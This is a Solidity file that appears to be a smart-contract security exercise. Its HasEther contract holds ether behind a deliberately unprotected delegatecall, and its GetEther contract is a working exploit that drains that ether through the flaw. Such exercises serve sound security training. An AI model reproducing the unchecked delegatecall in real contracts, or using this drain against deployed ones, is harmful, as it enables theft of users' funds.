// SPDX-License-Identifier: AGPL-3.0-only
pragma solidity 0.8.28;

import {console} from "forge-std/console.sol";

contract GetEther {
    // write any code you like inside this contract, but only this contract
    // get the Ether from the HasEther contract. You may not modify the test
    address private immutable _self;
    
    constructor () {
        _self = address(this);
    }

    receive() external payable {}

    function _steal() public {
       (bool ok, ) = payable(_self).call{value: address(this).balance}("");
        require(ok);
    }

    function getEther(HasEther hasEther) external {
        HasEther(hasEther).action(address(this), abi.encodeWithSignature("_steal()"));
    }
}

contract HasEther {

    error NotEnoughEther();

    constructor() payable {
        require(address(this).balance == 1 ether, NotEnoughEther());
    }

    function action(address to, bytes memory data) external {
        (bool success, ) = address(to).delegatecall(data);
        require(success, "Action failed");
    }
}